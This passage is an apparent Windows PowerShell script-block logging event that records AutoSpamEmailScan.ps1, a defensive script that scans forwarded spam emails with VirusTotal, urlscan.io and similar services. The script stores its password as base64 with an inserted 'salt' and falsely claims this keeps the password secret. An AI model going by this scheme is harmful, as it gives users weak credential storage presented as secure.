escape the scan.\r\n\tChange \"function Submit-URL-Virustotal\" to use the VirusTotal API V3\r\n\r\n\tCreation Date:  &lt;02/11/2020&gt;\r\n\tPurpose/Change: Add checkphish.ai API limit error\r\n\r\n\tCreation Date:  &lt;01/22/2020&gt;\r\n\tPurpose/Change: Add a new Function checkphish.ai\r\n\r\n\tCreation Date:  &lt;10/21/2019&gt;\r\n\tPurpose/Change: One funcation name was changed but calls the old name in the program. Update the Bytescout.PDF2HTML.dll to version 10.6.0.3667. It's still a trial version and will expire after 90 days. If you see this error: \r\n\t--------------------------------------------------------------------------------------\r\n\t\"new-object : Exception calling \".ctor\" with \"0\" argument(s): \"Trial period expired.\"\r\n\t+         $extractor = new-object Bytescout.PDF2HTML.HTMLExtractor\r\n\t--------------------------------------------------------------------------------------\r\n\tThat means the DLL file has been expired.\r\n\r\n.PRIVATEDATA\r\n\r\n.DESCRIPTION AutoSpamEmailScan.ps1 is used to monitor a specific mailbox that in enterprise users can forward suspicious spam emails to a specific mailbox.\r\n\tThis PowerShell script can monitor the mailbox for any unread emails, grab the URLs and attachments from the emails and submit to virustotal.com, urlscan.io, Google safe browsing and OPSWAT. Script also can extract URLs from a pdf file.\r\n\tAfter the scan finished, script can generate HTML format scan report and auto reply to the senders.\r\n\tScript can be run once or loop interval, if  in the init.conf is 0 means script will only run one time else the number is the loop interval seconds.\r\n\r\n\tVisit https://github.com/banhao/AutoSpamEmailScan to get the init.conf and Bytescout.PDF2HTML.dll, this dll file is used to convert PDF to HTML.\r\n\r\n\tPlease check the License before you download this script, if you don't agree with the License please don't download and use this script. https://github.com/banhao/AutoSpamEmailScan/blob/master/LICENSE\r\n\r\n\tThe Password is base64 encoded and saved in init.conf, following is the example about how to genertae the encoded password:\r\n\t\"JkPgsiG9Zh0XCvk\" is the password.\r\n\t\"yp9P7\" is the salt. make sure salt is the unique string that can't have the same pattern in the password.\r\n\tInsert the salt into password where ever you want:\r\n\typ9P7JkPgsiG9Zh0XCvk, JkPgsiG9Zh0XCvkyp9P7, JkPgyp9P7siG9Zh0XCvk, JkPgsiG9Zh0XCyp9P7vk, ...... all these are legitimate.\r\n\t\r\n\tGenerate the base64 encoded string:\r\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"yp9P7JkPgsiG9Zh0XCvk\"))\r\n\t\teQBwADkAUAA3AEoAawBQAGcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\r\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"JkPgsiG9Zh0XCvkyp9P7\"))\r\n\t\tSgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB2AGsAeQBwADkAUAA3AA==\r\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"JkPgyp9P7siG9Zh0XCvk\"))\r\n\t\tSgBrAFAAZwB5AHAAOQBQADcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\r\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"JkPgsiG9Zh0XCyp9P7vk\"))\r\n\t\tSgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB5AHAAOQBQADcAdgBrAA==\r\n\t\r\n\tSave the encoded string in the init.conf file.\r\n\t\r\n\tDecode the encoded string:\r\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"eQBwADkAUAA3AEoAawBQAGcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\"))\r\n\t\typ9P7JkPgsiG9Zh0XCvk\r\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"SgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB2AGsAeQBwADkAUAA3AA==\"))\r\n\t\tJkPgsiG9Zh0XCvkyp9P7\r\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"SgBrAFAAZwB5AHAAOQBQADcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\"))\r\n\t\tJkPgyp9P7siG9Zh0XCvk\r\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"SgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB5AHAAOQBQADcAdgBrAA==\"))\r\n\t\tJkPgsiG9Zh0XCyp9P7vk\r\n\t\r\n\tEven someone can get the encoded string from the init.conf and use base64 to decode it, but they don't know the salt, so they still can't get the password directly.\r\n\r\n\tThis PowerShell passed the test in PowerShell version 5.1.16299.1146. Can not run on Powershell version 4 and below.\r\n\tPS H:\\&gt;host  \r\n\tCheck the PowerShell version.\r\n\r\n#&gt;\r\n\r\n\r\n#-------------------------------------------------------------------------------------------------------------------------------------------------------\r\n#variables\r\nparam ($CREDENTIAL,$SALT)\r\ncls\r\n$BANNER = @\"\r\n\r\n    #                            #####                          #######                            #####                       \r\n   # #   #    # #####  ####     #     # #####    ##   #    #    #       #    #   ##   # #         #     #  ####    ##   #    # \r\n  #   #  #    #   #   #    #    #       #    #  #  #  ##  ##    #       ##  ##  #  #  # #         #       #    #  #  #  ##   # \r\n #     # #    #   #   #    #     #####  #    # #    # # ## #    #####   # ## # #    # # #          #####  #      #    # # #  # \r\n ####### #    #   #   #    #          # #####  ###### #    #    #       #    # ###### # #               # #      ###### #  # # \r\n #     # #    #   #   #    #    #     # #      #    # #    #    #       #    # #    # # #         #     # #    # #    # #   ## \r\n #     #  ####    #    ####      #####  #      #    # #    #    ####### #    # #    # # ######     #####   ####  #    # #    # \r\n\r\n    Copyright  Hao Ban - 2022\r\n    Issue Date: November 07, 2022\r\n    Version: 5.2.0\r\n    Author: Hao Ban &lt;banhao@gmail.com&gt;\r\n\"@\r\nWrite-Host $BANNER `r`n\r\n\r\n$ALLPYTHONMODULEOFF = $false\r\n$PYTHONVERSION = &amp;{python -V} 2&gt;&amp;1\r\n\r\nif($PYTHONVERSION -is [System.Management.Automation.ErrorRecord]) {\r\n\t$PYTHONVERSION.Exception.Message\r\n\tWrite-Host \"***** CAN NOT FIND PYTHON ENVIRONMENT. *****\" -ForegroundColor red `r`n\r\n\tWrite-Host \"***** All THE PYTHON MODULES WILL BE DISABLED. *****\" -ForegroundColor red `r`n\r\n\t$ALLPYTHONMODULEOFF = $true\r\n}else {\r\n    if ([System.Version]$PYTHONVERSION.split(\"\")[1] -lt [System.Version]\"3.6.0\") {\r\n\t\tWrite-Host \"***** THE PYTHON VERSION DOES NOT MATCH THE MINIMUM REQUIREMENT. *****\" -ForegroundColor red `r`n\r\n\t\tWrite-Host \"***** All THE PYTHON MODULES WILL BE DISABLED. *****\" -ForegroundColor red `r`n\r\n\t\t$ALLPYTHONMODULEOFF = $true\r\n\t}\r\n}\r\n\r\n$global:MODULE_LIST = New-Object System.Collections.Generic.Dictionary\"[String,String]\"\r\n$MODULES = $(Select-Xml -Path .\\module.xml -XPath \"//SETTINGS/MODULE\" | foreach {$_.node}).'#text'\r\n$xmlSETTINGS = [xml](Get-Content -Path .\\module.xml)\r\nforeach ($module in $MODULES){\r\n\tif ( $module.trim() -like \"*.py\" -and $ALLPYTHONMODULEOFF ) {\r\n\t\t$global:MODULE_LIST.add($($module.trim()), \"OFF\")\r\n\t\tWrite-Host \"##### [$($module.trim())] is turned\" -NoNewline\r\n\t\tWrite-Host \" [OFF] \" -ForegroundColor red -NoNewline\r\n\t\tWrite-Host \"#####\" `r\r\n\t\t$COMMENT = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/COMMENT\").'#text').Trim()\r\n\t\tWrite-Host \"      |-$COMMENT\" `r`n\r\n\t\t\r\n\t}else {\t\r\n\t\tif ( Test-Path -path \".\\$($module.trim())\" ){\r\n\t\t\t$ONOFF = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/ENABLE\").'#text').Trim()\r\n\t\t\t$global:MODULE_LIST.add($($module.trim()), $ONOFF)\r\n\t\t\tif ( $ONOFF -eq \"OFF\" ) {\r\n\t\t\t\tWrite-Host \"##### [$($module.trim())] is in the current folder and is turned\" -NoNewline\r\n\t\t\t\tWrite-Host \" [$ONOFF] \" -ForegroundColor red -NoNewline\r\n\t\t\t\tWrite-Host \"#####\" `r\r\n\t\t\t\t$COMMENT = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/COMMENT\").'#text').Trim()\r\n\t\t\t\tWrite-Host \"      |-$COMMENT\" `r`n\r\n\t\t\t}else{\r\n\t\t\t\tWrite-Host \"##### [$($module.trim())] is in the current folder and is turned [$ONOFF]  #####\" `r`n -ForegroundColor green\r\n\t\t\t}\r\n\t\t}else{\r\n\t\t\t$global:MODULE_LIST.add($($module.trim()), \"OFF\")\r\n\t\t\tWrite-Host \"***** CANNOT FIND [$($module.trim())] IN THE CURRENT FOLDER, SO THE FEATURE WILL BE DISABLED. *****\" -ForegroundColor red `r\r\n\t\t\t$COMMENT = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/COMMENT\").'#text').Trim()\r\n\t\t\tWrite-Host \"      |-$COMMENT\" `r`n\r\n\t\t}\r\n\t}\r\n}\r\n\r\nif ( [string]::IsNullOrEmpty($CREDENTIAL) -and [string]::IsNullOrEmpty($SALT) ){\r\n\t$YorN = Read-Host \"Do you want to input the Credential? [ y/n ] (Default is y)\"\r\n\tif ( $YorN -match \"[yY]\" -or ([string]::IsNullOrEmpty($YorN))){\r\n\t\t$USERNAME = Get-Content .\\init.conf | findstr ADUSERNAME |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n\t\t$CREDENTIAL = Get-Credential -credential $USERNAME\r\n\t\t$PASSWORD = $CREDENTIAL.Password\r\n\t}else{\r\n\t\t$ENCODEDPASSWORD = Get-Content .\\init.conf | findstr ADPASSWORD |  %{ $_.Split(':')[1]; } | foreach{ $_.ToString().Trim() }\r\n\t\t$USERNAME = Get-Content .\\init.conf | findstr ADUSERNAME |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n\t\tif ( [string]::IsNullOrEmpty($SALT) ){\r\n\t\t\t$YorN = Read-Host \"The salt is empty. Do you want to input the salt to decrypt the password? [ y/n ] (Default is y)\"\r\n\t\t\tif ( $YorN -match \"[yY]\" -or ([string]::IsNullOrEmpty($YorN))){\r\n\t\t\t\t$SALT = Read-Host -assecurestring \"Please input the salt\"\r\n\t\t\t\t$PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SALT))),\"\")\r\n\t\t\t}else{ $PASSWORD = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD)) }\r\n\t\t}else { $PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($SALT,\"\") }\r\n\t}\r\n}else{\r\n\t$ENCODEDPASSWORD = Get-Content .\\init.conf | findstr ADPASSWORD |  %{ $_.Split(':')[1]; } | foreach{ $_.ToString().Trim() }\r\n\t$USERNAME = Get-Content .\\init.conf | findstr ADUSERNAME |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n\tif ( [string]::IsNullOrEmpty($SALT) ){\r\n\t\t$YorN = Read-Host \"The salt is empty. Do you want to input the salt to decrypt the password? [ y/n ] (Default is y)\"\r\n\t\tif ( $YorN -match \"[yY]\" -or ([string]::IsNullOrEmpty($YorN))){\r\n\t\t\t$SALT = Read-Host -assecurestring \"Please input the salt\"\r\n\t\t\t$PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SALT))),\"\")\r\n\t\t}else{ $PASSWORD = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD)) }\r\n\t}else { $PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($SALT,\"\") }\r\n}\r\n\r\n$DOMAIN = Get-Content .\\init.conf | findstr DOMAIN |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$EMAILADDRESS = Get-Content .\\init.conf | findstr EMAILADDRESS |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$EWSDLLPATH = Get-Content .\\init.conf | findstr EWSDLLPATH |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$DOWNLOADDIRECTORY =  Get-Content .\\init.conf | findstr DOWNLOADDIRECTORY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$REPORTSDIRECTORY = Get-Content .\\init.conf | findstr REPORTSDIRECTORY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$EXTENSIONARRAY = Get-Content .\\init.conf | findstr EXTENSIONARRAY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$EXEMPTURL = (Get-Content .\\init.conf | findstr EXEMPTURL |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }).split(\",\")\r\n$SUBFOLDER = Get-Content .\\init.conf | findstr SUBFOLDER | %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$INTERVAL = [int]$(Get-Content .\\init.conf | findstr INTERVAL | %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() })\r\n$VIRUSTOTAL_API_KEY = Get-Content .\\init.conf | findstr VIRUSTOTAL_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$URLSCAN_API_KEY = Get-Content .\\init.conf | findstr URLSCAN_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$GOOGLE_API_KEY = Get-Content .\\init.conf | findstr GOOGLE_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$OPSWAT_API_KEY = Get-Content .\\init.conf | findstr OPSWAT_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$CHECKPHISH_API_KEY = Get-Content .\\init.conf | findstr CHECKPHISH_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n\r\n$global:enable_SecureX = $false\r\n\r\nfunction Google-Safe-Browsing {\r\n\tWrite-OutPut \"Google Safe Browsing Scan Report: \" &gt;&gt; $LOGFILE\r\n\t$BODY = @()\r\n\t$BODY +=[pscustomobject]@{\"client\" = @{\"clientId\" = \"eHealth Saskatche\"; \"clientVersion\" = \"1.0\"}; \"threatInfo\" = @{\"threatTypes\" = \"MALWARE\",\"SOCIAL_ENGINEERING\"; \"platformTypes\" = \"WINDOWS\"; \"threatEntryTypes\" = \"URL\"; \"threatEntries\" = @{\"url\" = \"$URL\"}}}\r\n\t$HEADERS = @{ 'Content-Type' = \"application/json\" }\r\n\t$JSONBODY = $BODY | ConvertTo-Json\r\n\t$Uri = 'https://safebrowsing.googleapis.com/v4/threatMatches:find?key='+ $GOOGLE_API_KEY\r\n\t$Results = Invoke-RestMethod -Method 'POST' -Uri $Uri -Body $JSONBODY -Headers $HEADERS\r\n\tif ( ([string]::IsNullOrEmpty($Results)) ) {\r\n\t\tWrite-OutPut \"Can not find the result in Google Safe Browsing Scan.\"  &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t }else{\r\n\t\t$ThreatType = $Results | select -expand matches | select threatType\r\n\t\tif ( ($ThreatType.threatType -eq \"SOCIAL_ENGINEERING\") -or ($ThreatType.threatType -eq \"MALWARE\") -or ($ThreatType.threatType -eq \"POTENTIALLY_HARMFUL_APPLICATION\") ) { $global:enable_SecureX = $true }\r\n\t\tWrite-OutPut \"Google Safe Browsing Scan Results:    \",$($ThreatType) &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t}\r\n}\r\n\r\nfunction Submit-URLSCAN {\r\n\tWrite-OutPut \"URLscan Scan Report: \" &gt;&gt; $LOGFILE\r\n\t$BODY = @{ 'url' = \"$URL\"; 'public' = 'on' }\r\n\t$HEADERS = @{ 'API-Key' = \"$URLSCAN_API_KEY\" }\r\n\tTry { $SCANRESPONSE = Invoke-RestMethod -Method 'POST' -Uri 'https://urlscan.io/api/v1/scan/' -Headers $HEADERS -Body $BODY } Catch { $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()) }\r\n\tif ( [string]::IsNullOrEmpty($SCANRESPONSE) ) {\r\n\t\t$reader.BaseStream.Position = 0\r\n\t\t$reader.DiscardBufferedData()\r\n\t\t$Exception = $reader.ReadToEnd() | ConvertFrom-Json\r\n\t}\r\n\tif ( -not ([string]::IsNullOrEmpty($Exception)) ) {\r\n\t\tWrite-Output \"Exception Error:\" $Exception.description &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t}else{ \t\r\n\t\t$RESPONSEAPI = $SCANRESPONSE.api\r\n\t\tDo {\r\n\t\t\tStart-Sleep -s 30\r\n\t\t\t$RESPONSE = try { $SCANRESULT = Invoke-RestMethod -Method 'GET' -Uri $RESPONSEAPI } catch { $_.Exception.Response.StatusCode.Value__}\r\n\t\t}Until($RESPONSE -ne 404)\r\n\t\t$ReportURL = $SCANRESULT.task.reportURL\r\n\t\t$ScreenShot = $SCANRESULT.task.screenshotURL\r\n\r\n\t\tWrite-OutPut \"ScanReportURL:     \",$($ReportURL) &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"ScreenShotURL:     \",$($ScreenShot) &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\tStart-Sleep -s 3\r\n\t}\r\n}\r\n\r\nfunction Submit-URL-Virustotal {\r\n\t$BODY = @{ \"url\" = \"$URL\" }\r\n\t$HEADERS = @{ \"x-apikey\" = \"$VIRUSTOTAL_API_KEY\" }\r\n\t$SCAN = Invoke-RestMethod -Method 'POST' -Uri \"https://www.virustotal.com/api/v3/urls\" -Headers $HEADERS -Body $BODY\r\n\t$RESULTID = $SCAN.data.i\r\n\r\nScriptBlock ID: 5b10436f-ec14-4c18-b4ca-12f2db33c2be\r\nPath: C:\\Users\\vagrant\\posh\\AutoSpamEmailScan.ps1</Message><Level>Warning</Level><Task>Execute a Remote Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event>",
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "3",
                    "ScriptBlockText": "<#PSScriptInfo\n\n.VERSION 5.2.0\n\n.GUID 134de175-8fd8-4938-9812-053ba39eed83\n\n.AUTHOR HAO BAN/banhao@gmail.com\n\n.COMPANYNAME\n\n.COPYRIGHT\n\n.TAGS\n\n.LICENSEURI https://github.com/banhao/AutoSpamEmailScan/blob/master/LICENSE\n\n.PROJECTURI\n\n.ICONURI\n\n.EXTERNALMODULEDEPENDENCIES Before you run the script Install the Exchange Web Services Managed API 2.2. https://www.microsoft.com/en-us/download/details.aspx?id=42951 \n\n.REQUIREDSCRIPTS\n\n.EXTERNALSCRIPTDEPENDENCIES\n\n.RELEASENOTES\n\tCreation Date:  <11/08/2022>\n\tPurpose/Change: Remove module \"EncodedHTML\". Add BANNER. Add module check.\n\t\n\tCreation Date:  <09/21/2022>\n\tPurpose/Change: Add Hash Value into MineMeld when the attachment scan result is positive\n\t\n\tCreation Date:  <09/09/2022>\n\tPurpose/Change: Add module \"EncodedHTML\"\n\t\n\tCreation Date:  <08/17/2022>\n\tPurpose/Change: Add module \"extract_hyperlink_from_Excel\"\n\t\n\tCreation Date:  <06/10/2022>\n\tPurpose/Change: optimize some outputs format.\n\t\n\tCreation Date:  <05/31/2022>\n\tPurpose/Change: Rename some variables.\n\t\n\tCreation Date:  <05/30/2022>\n\tPurpose/Change: Optimize the module \"CheckRedirectedURL\", skip scan the URL if the URL contain file types in variable \"$EXTENSIONARRAY\" \n\t\n\tCreation Date:  <05/26/2022>\n\tPurpose/Change: Add \"RedirectURL.py\" to replace the powershell script.\n\t\t\t\t\tAdd \"pdf2url.py\" to replace the \"Bytescout.PDF2HTML.dll\"\n\t\t\t\t\tAdd \"Submit_FILE_Virustotal.py\" to replace the \"Submit-FILE-Virustotal\" and call VirusTotal V3 API\n\t\n\tCreation Date:  <05/09/2022>\n\tPurpose/Change: Add \"selenium_simulator.py\" to open HTML file on local and get screenshot. \n\t\n\tCreation Date:  <05/03/2022>\n\tPurpose/Change: optimize the method to extract email address from the mail body.\n\t\n\tCreation Date:  <04/28/2022>\n\tPurpose/Change: Instead the \"Cisco SecureX Investigation Module\" with the \"secureX.ps1\"\n\t\t\t\t\tAdd \"MineMeld_Indicator.ps1\"\n\t\t\t\t\tAdd ESA_Spam_Block.ps1\n\t\t\t\t\tRemove \"checkphish.ai\" module\n\t\n\tCreation Date:  <09/20/2021>\n\tPurpose/Change: Fixed Function \"ESASpamQuarantine\" a small bug.\n\t\n\tCreation Date:  <07/08/2021>\n\tPurpose/Change: add Cisco SecureX Investigation Module\n\t\n\tCreation Date:  <05/26/2021>\n\tPurpose/Change: Fixed some bugs\n\n\tCreation Date:  <05/19/2021>\n\tPurpose/Change: Add \"BlockedMailSelfRelease\" function. If you donnot have ESA/SMA or donott want to use ESA/SMA API to block SPAM sender or release blocked emails from quarantine then please setup \"ENABLEESASPAMBL\" and \"ENABLESELFRELEASE\" as \"False\" in init.conf  \n\n\tCreation Date:  <05/13/2021>\n\tPurpose/Change: Add \"slblconfig EXPORT\" after update the Cisco Email Security Appliance Spam Quarantine Blacklist.(related to Cisco Bug CSCvx12488)\n\tssh PRIVATE KEY must be save in \"c:\\users\\<username>\\.ssh\\\" folder. \".ssh\" folder must disable \"inheritance\" and manually grant \"local\\SYSTEM\" group, \"local\\Administrators\" group \"full control\" privilege, and current user \"read only\" privilege.\n\n\tCreation Date:  <04/05/2021>\n\tPurpose/Change: Optimize function CheckRedirectedURL{}\n\n\tCreation Date:  <03/25/2021>\n\tPurpose/Change: Update function CheckRedirectedURL{}\n\n\tCreation Date:  <03/19/2021>\n\tPurpose/Change: Add a new module for Cisco Email Security Appliance Spam Quarantine Blacklist.\n\n\tCreation Date:  <11/10/2020>\n\tPurpose/Change: Move emails to sub-folder when after the checking.\n\n\tCreation Date:  <04/03/2020>\n\tPurpose/Change: Optimize the parameters setting.\n\n\tCreation Date:  <04/02/2020>\n\tPurpose/Change: Add new feature to let the use input the credential just chose \"N\" when prompt \"salt is empty\". Add SystemException, fix the broken of the system error.\n\n\tCreation Date:  <03/10/2020>\n\tPurpose/Change: Add a new Function CheckRedirectedURL, this feature is used to detect URLs that try to escape the scan.\n\tChange \"function Submit-URL-Virustotal\" to use the VirusTotal API V3\n\n\tCreation Date:  <02/11/2020>\n\tPurpose/Change: Add checkphish.ai API limit error\n\n\tCreation Date:  <01/22/2020>\n\tPurpose/Change: Add a new Function checkphish.ai\n\n\tCreation Date:  <10/21/2019>\n\tPurpose/Change: One funcation name was changed but calls the old name in the program. Update the Bytescout.PDF2HTML.dll to version 10.6.0.3667. It's still a trial version and will expire after 90 days. If you see this error: \n\t--------------------------------------------------------------------------------------\n\t\"new-object : Exception calling \".ctor\" with \"0\" argument(s): \"Trial period expired.\"\n\t+         $extractor = new-object Bytescout.PDF2HTML.HTMLExtractor\n\t--------------------------------------------------------------------------------------\n\tThat means the DLL file has been expired.\n\n.PRIVATEDATA\n\n.DESCRIPTION AutoSpamEmailScan.ps1 is used to monitor a specific mailbox that in enterprise users can forward suspicious spam emails to a specific mailbox.\n\tThis PowerShell script can monitor the mailbox for any unread emails, grab the URLs and attachments from the emails and submit to virustotal.com, urlscan.io, Google safe browsing and OPSWAT. Script also can extract URLs from a pdf file.\n\tAfter the scan finished, script can generate HTML format scan report and auto reply to the senders.\n\tScript can be run once or loop interval, if  in the init.conf is 0 means script will only run one time else the number is the loop interval seconds.\n\n\tVisit https://github.com/banhao/AutoSpamEmailScan to get the init.conf and Bytescout.PDF2HTML.dll, this dll file is used to convert PDF to HTML.\n\n\tPlease check the License before you download this script, if you don't agree with the License please don't download and use this script. https://github.com/banhao/AutoSpamEmailScan/blob/master/LICENSE\n\n\tThe Password is base64 encoded and saved in init.conf, following is the example about how to genertae the encoded password:\n\t\"JkPgsiG9Zh0XCvk\" is the password.\n\t\"yp9P7\" is the salt. make sure salt is the unique string that can't have the same pattern in the password.\n\tInsert the salt into password where ever you want:\n\typ9P7JkPgsiG9Zh0XCvk, JkPgsiG9Zh0XCvkyp9P7, JkPgyp9P7siG9Zh0XCvk, JkPgsiG9Zh0XCyp9P7vk, ...... all these are legitimate.\n\t\n\tGenerate the base64 encoded string:\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"yp9P7JkPgsiG9Zh0XCvk\"))\n\t\teQBwADkAUAA3AEoAawBQAGcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"JkPgsiG9Zh0XCvkyp9P7\"))\n\t\tSgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB2AGsAeQBwADkAUAA3AA==\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"JkPgyp9P7siG9Zh0XCvk\"))\n\t\tSgBrAFAAZwB5AHAAOQBQADcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"JkPgsiG9Zh0XCyp9P7vk\"))\n\t\tSgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB5AHAAOQBQADcAdgBrAA==\n\t\n\tSave the encoded string in the init.conf file.\n\t\n\tDecode the encoded string:\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"eQBwADkAUAA3AEoAawBQAGcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\"))\n\t\typ9P7JkPgsiG9Zh0XCvk\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"SgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB2AGsAeQBwADkAUAA3AA==\"))\n\t\tJkPgsiG9Zh0XCvkyp9P7\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"SgBrAFAAZwB5AHAAOQBQADcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\"))\n\t\tJkPgyp9P7siG9Zh0XCvk\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"SgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB5AHAAOQBQADcAdgBrAA==\"))\n\t\tJkPgsiG9Zh0XCyp9P7vk\n\t\n\tEven someone can get the encoded string from the init.conf and use base64 to decode it, but they don't know the salt, so they still can't get the password directly.\n\n\tThis PowerShell passed the test in PowerShell version 5.1.16299.1146. Can not run on Powershell version 4 and below.\n\tPS H:\\>host  \n\tCheck the PowerShell version.\n\n#>\n\n\n#-------------------------------------------------------------------------------------------------------------------------------------------------------\n#variables\nparam ($CREDENTIAL,$SALT)\ncls\n$BANNER = @\"\n\n    #                            #####                          #######                            #####                       \n   # #   #    # #####  ####     #     # #####    ##   #    #    #       #    #   ##   # #         #     #  ####    ##   #    # \n  #   #  #    #   #   #    #    #       #    #  #  #  ##  ##    #       ##  ##  #  #  # #         #       #    #  #  #  ##   # \n #     # #    #   #   #    #     #####  #    # #    # # ## #    #####   # ## # #    # # #          #####  #      #    # # #  # \n ####### #    #   #   #    #          # #####  ###### #    #    #       #    # ###### # #               # #      ###### #  # # \n #     # #    #   #   #    #    #     # #      #    # #    #    #       #    # #    # # #         #     # #    # #    # #   ## \n #     #  ####    #    ####      #####  #      #    # #    #    ####### #    # #    # # ######     #####   ####  #    # #    # \n\n    Copyright  Hao Ban - 2022\n    Issue Date: November 07, 2022\n    Version: 5.2.0\n    Author: Hao Ban <banhao@gmail.com>\n\"@\nWrite-Host $BANNER `r`n\n\n$ALLPYTHONMODULEOFF = $false\n$PYTHONVERSION = &{python -V} 2>&1\n\nif($PYTHONVERSION -is [System.Management.Automation.ErrorRecord]) {\n\t$PYTHONVERSION.Exception.Message\n\tWrite-Host \"***** CAN NOT FIND PYTHON ENVIRONMENT. *****\" -ForegroundColor red `r`n\n\tWrite-Host \"***** All THE PYTHON MODULES WILL BE DISABLED. *****\" -ForegroundColor red `r`n\n\t$ALLPYTHONMODULEOFF = $true\n}else {\n    if ([System.Version]$PYTHONVERSION.split(\"\")[1] -lt [System.Version]\"3.6.0\") {\n\t\tWrite-Host \"***** THE PYTHON VERSION DOES NOT MATCH THE MINIMUM REQUIREMENT. *****\" -ForegroundColor red 